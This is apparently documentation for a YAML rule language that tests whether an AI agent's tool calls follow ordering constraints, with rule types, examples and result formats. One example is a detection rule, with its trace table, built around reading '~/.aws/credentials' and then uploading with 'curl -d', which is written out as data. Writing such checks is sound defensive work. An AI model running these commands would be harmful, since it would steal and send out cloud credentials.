# Sequence Rules DSL

Define valid tool call sequences with declarative rules.

---

## Overview

The Sequence Rules DSL lets you enforce **order constraints** on tool calls:

- "Always verify identity before deleting a customer"
- "Never call admin tools from untrusted contexts"
- "Read before write"

These rules are **deterministic** — they produce pass/fail results with no ambiguity.

---

## Quick Example

```yaml
# eval.yaml
configVersion: 1
suite: customer_support
model: trace
tests:
  - id: verify_before_delete
    input:
      prompt: "Delete customer 42"
    expected:
      type: sequence_valid
      rules:
        - type: before
          first: VerifyIdentity
          then: DeleteCustomer
```

If your agent calls `DeleteCustomer` without first calling `VerifyIdentity`, the test fails.

The rules can also live in their own file. Point `policy:` at it:

```yaml
expected:
  type: sequence_valid
  policy: sequences.yaml
```

The file is either a YAML list of rules, or a policy file with a `version` and a `sequences:` key
that holds them:

```yaml
version: "1.0"
sequences:
  - type: before
    first: VerifyIdentity
    then: DeleteCustomer
```

A test refuses a policy file that declares `aliases`, with a configuration error that names the
file and its aliases, because it does not apply them to the rules. Name the member tools in the
rules instead.

---

## Rule Types

### `require` — Must Contain

The trace must contain at least one call to the specified tool.

```yaml
rules:
  - type: require
    tool: VerifyIdentity
```

| Trace | Result |
|-------|--------|
| `[GetCustomer, VerifyIdentity, UpdateCustomer]` | ✅ Pass |
| `[GetCustomer, UpdateCustomer]` | ❌ Fail |

---

### `before` — Order Constraint

Tool A must be called before Tool B (at least once).

```yaml
rules:
  - type: before
    first: GetCustomer
    then: UpdateCustomer
```

| Trace | Result |
|-------|--------|
| `[GetCustomer, UpdateCustomer]` | ✅ Pass |
| `[UpdateCustomer, GetCustomer]` | ❌ Fail |
| `[GetCustomer, UpdateCustomer, GetCustomer]` | ✅ Pass |

**Note:** `before` checks that *at least one* call to `first` happens before *the first* call to `then`.

---


### `blocklist` — Forbidden Tools

These tools must never be called.

```yaml
rules:
  - type: blocklist
    pattern: admin_delete
```

| Trace | Result |
|-------|--------|
| `[GetCustomer, UpdateCustomer]` | ✅ Pass |
| `[GetCustomer, admin_delete]` | ❌ Fail |

Matching is by plain substring, so a prefix blocks every tool that starts with it. A `*` is
matched literally, not as a wildcard:

```yaml
rules:
  - type: blocklist
    pattern: admin_
```

---


### `max_calls` — Call Frequency Limit

Limit how many times a tool can be called (formerly `count`).

```yaml
rules:
  - type: max_calls
    tool: SendEmail
    max: 3
```

| Trace | Result |
|-------|--------|
| `[SendEmail, SendEmail]` | ✅ Pass |
| `[SendEmail, SendEmail, SendEmail, SendEmail]` | ❌ Fail |

---

### `eventually` — Temporal Deadline

A tool must be called within `N` steps of the start of the trace.

```yaml
rules:
  - type: eventually
    tool: ValidateOutput
    within: 5
```

| Trace | Result |
|-------|--------|
| `[Step1, ..., Step4, ValidateOutput]` | ✅ Pass |
| `[Step1, ..., Step10]` (no validation) | ❌ Fail |

---

### `never_after` — Forbidden Transition

A forbidden tool must never be called after a trigger tool has been used.

```yaml
rules:
  - type: never_after
    trigger: CommitTransaction
    forbidden: ModifyData
```

| Trace | Result |
|-------|--------|
| `[ModifyData, CommitTransaction]` | ✅ Pass |
| `[CommitTransaction, ModifyData]` | ❌ Fail |

---

### `after` — Dependent Deadline

Tool B must be called within `N` steps **after** Tool A occurred.

```yaml
rules:
  - type: after
    trigger: OpenFile
    then: CloseFile
    within: 10
```

| Trace | Result |
|-------|--------|
| `[OpenFile, Read, CloseFile]` | ✅ Pass |
| `[OpenFile, ..., (10 steps), ...]` | ❌ Fail |

---

### `sequence` — Exact Ordering

The named tools must appear in the given order. With `strict: false` (the default) other
tools may appear between them; with `strict: true` they must be consecutive.

```yaml
rules:
  - type: sequence
    tools:
      - Authenticate
      - LoadRecord
      - WriteRecord
    strict: false   # optional
```

| Trace | `strict: false` | `strict: true` |
|-------|-----------------|----------------|
| `[Authenticate, LoadRecord, WriteRecord]` | ✅ Pass | ✅ Pass |
| `[Authenticate, Audit, LoadRecord, WriteRecord]` | ✅ Pass | ❌ Fail |
| `[LoadRecord, Authenticate, WriteRecord]` | ❌ Fail | ❌ Fail |

A trace that never calls any named tool does not exercise this rule; a trace that starts the
sequence and ends part-way through fails it, because the ordering it asserts was not completed.

---

### Matching arguments

Wherever a rule names a tool (`tool`, `first`, `then`, `trigger`, `forbidden` and each entry of
`tools`), it can name a call instead: a tool plus `args_match`, a map from argument name to
regular expression. Every named argument must be present, and its value (as JSON text, for
non-string values) must match. `blocklist` takes a plain substring and has no argument form.

```yaml
rules:
  # A credential read followed by an upload. Both calls are `bash`; only the arguments differ.
  - type: never_after
    trigger: { tool: bash, args_match: { command: "\\.aws/credentials" } }
    forbidden: { tool: bash, args_match: { command: "^curl .*-d" } }
```

| Trace | Result |
|-------|--------|
| `[bash "cat ~/.aws/credentials", bash "curl https://example.invalid -d @-"]` | ❌ Fail |
| `[bash "curl https://example.invalid -d @-", bash "cat ~/.aws/credentials"]` | ✅ Pass |
| `[bash "ls"]` | Not exercised |

---

## Combining Rules

Rules are evaluated with **AND** logic. All rules must pass.

```yaml
configVersion: 1
suite: customer_support
model: trace
tests:
  - id: customer_workflow
    input:
      prompt: "Close the account of customer 42"
    expected:
      type: sequence_valid
      rules:
        # Must verify identity
        - type: require
          tool: VerifyIdentity

        # Must verify before any destructive action
        - type: before
          first: VerifyIdentity
          then: DeleteCustomer

        # Never call admin tools
        - type: blocklist
          pattern: admin_

        # Max 5 API calls
        - type: max_calls
          tool: ExternalAPI
          max: 5
```

---

## Results

`assay run` names the failing test on stderr and exits 1:

```
❌ verify_before_delete failed: sequence_valid  (0.0s)
```

Every rule's outcome is recorded in `run.json`, under
`results[].details.metrics.sequence_valid.details.rule_evaluations`. Each record has the rule's
id, its kind, an `outcome` of `held`, `violated` or `not_exercised`, the trace indices it spanned
and, unless it held, a reason:

```json
{
  "rule_id": "before:VerifyIdentity->DeleteCustomer",
  "kind": "before",
  "outcome": "violated",
  "spanned": [1],
  "reason": "tool 'DeleteCustomer' was found (index 1) but required preceding tool 'VerifyIdentity' was missing"
}
```

A rule whose trigger never appeared is `not_exercised`, not `held`. When every rule in a test is
`not_exercised`, the test still passes, and the metric records `"exercised": "not_exercised"`:
that field, not the pass, tells a policy that held from one nothing tested.

---

## Real-World Patterns

### E-commerce: Payment Flow

```yaml
rules:
  # Validate cart before checkout
  - type: before
    first: ValidateCart
    then: ProcessPayment

  # Verify inventory before charging
  - type: before
    first: CheckInventory
    then: ProcessPayment

  # Never refund more than once
  - type: max_calls
    tool: ProcessRefund
    max: 1
```

### Healthcare: Data Access

```yaml
rules:
  # Always authenticate
  - type: require
    tool: AuthenticateUser

  # Authenticate before any data access
  - type: before
    first: AuthenticateUser
    then: GetPatientRecord

  # Log all access
  - type: after
    trigger: GetPatientRecord
    then: LogAccess
    within: 1

  # No admin tools
  - type: blocklist
    pattern: admin_
```

### Agent Handoffs: Multi-Agent

```yaml
rules:
  # Router must run first
  - type: before
    first: RouterAgent
    then: SpecialistA

  # Only one specialist per request
  - type: max_calls
    tool: SpecialistA
    max: 1
  - type: max_calls
    tool: SpecialistB
    max: 1
```

---

## Migrating from v0

If you have old-style sequence configs:

```bash
assay migrate --config eval.yaml
```

This converts:

<!-- docs-example: not-a-config (the v0 format that assay migrate reads) -->
```yaml
# Old format (v0)
sequences:
  - [GetCustomer, UpdateCustomer]
```

To:

```yaml
# New format (v1)
rules:
  - type: before
    first: GetCustomer
    then: UpdateCustomer
```

---

## Best Practices

### 1. Start Simple

Begin with `blocklist` and `require`, then add `before` rules.

```yaml
rules:
  - type: blocklist
    pattern: admin_
  - type: require
    tool: Authenticate
```

### 2. Use Descriptive IDs

<!-- docs-example: not-a-config (shows test ids only) -->
```yaml
tests:
  - id: auth_before_data_access  # ✅ Clear
  - id: test_1                   # ❌ Unclear
```

### 3. Keep Rules Focused

One rule per concern. Don't combine unrelated checks.

### 4. Test the Rules Themselves

Create traces that *should* fail to verify your rules catch violations.

---

## Reference

| Rule Type | Required Fields | Optional Fields |
|-----------|-----------------|-----------------|
| `require` | `tool` | — |
| `before` | `first`, `then` | — |
| `blocklist` | `pattern` | — |
| `max_calls` | `tool`, `max` | — |
| `eventually` | `tool`, `within` | — |
| `never_after` | `trigger`, `forbidden` | — |
| `after` | `trigger`, `then` | `within` (default 1) |
| `sequence` | `tools` | `strict` |

Every field that names a tool also accepts `{ tool, args_match }` (see
[Matching arguments](#matching-arguments)); `pattern` does not.

---

## See Also

- [Metrics Reference: sequence_valid](../../metrics/sequence-valid.md)
- [Policy Files](policies.md)
- [Migration Guide](migration.md)
